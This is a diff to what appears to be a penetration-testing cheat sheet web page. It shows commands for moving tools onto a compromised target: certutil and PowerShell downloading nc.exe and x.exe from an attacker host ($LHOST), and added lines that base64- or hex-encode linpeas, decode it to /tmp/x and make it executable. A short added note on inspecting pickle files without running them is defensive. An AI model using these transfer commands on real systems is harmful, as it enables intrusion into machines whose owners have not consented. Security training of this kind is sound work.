@@ -121,7 +121,7 @@ code{font-family:var(--mono);font-size:12.5px;color:#d7e3f4;background:var(--ele
   <a href="arsenal.html">arsenal</a>
   <a href="cheatsheet.html" aria-current="page">cheat sheet</a>
   <span class="sep"></span>
-  <span class="ver">v1.12.1</span>
+  <span class="ver">v1.12.2</span>
   <button type="button" id="printBtn">print</button>
 </nav>
 
@@ -412,7 +412,14 @@ certutil -urlcache -f http://$LHOST/nc.exe nc.exe
 powershell -c &quot;iwr http://$LHOST/x.exe -o x.exe&quot;
 # via SMB (Windows pull)
 impacket-smbserver share . -smb2support     # your box
-copy \\$LHOST\share\file.exe                 # target</code></pre></div>
+copy \\$LHOST\share\file.exe                 # target
+# no outbound at all? move it through the shell you already have
+base64 -w0 linpeas.sh                        # your box (-w0 or the paste wraps and breaks); xxd -p if b64 is filtered
+echo &#x27;&lt;blob&gt;&#x27; | base64 -d &gt; /tmp/x &amp;&amp; chmod +x /tmp/x   # target;  echo &#x27;&lt;hex&gt;&#x27; | xxd -r -p &gt; /tmp/x
+certutil -decode b64.txt out.exe             # Windows target</code></pre></div>
+<p><strong>Inspect a file, do not run it</strong> — a <code>.pkl</code>/<code>.joblib</code>/<code>.pt</code> is pickle = code; <code>pickle.load()</code> runs its <code>__reduce__</code> as you.</p>
+<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>file thing.pkl; xxd thing.pkl | head; strings -n 6 thing.pkl   # posix/system/eval in the strings = the answer
+# magic: 80 04=pickle  ac ed 00 05=java  50 4b 03 04=zip/jar/docx  7f 45 4c 46=ELF</code></pre></div>
 <h2 id="privilege-escalation-first-moves">Privilege escalation, first moves</h2>
 <div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code># Linux
 ./linpeas.sh | tee linpeas.txt
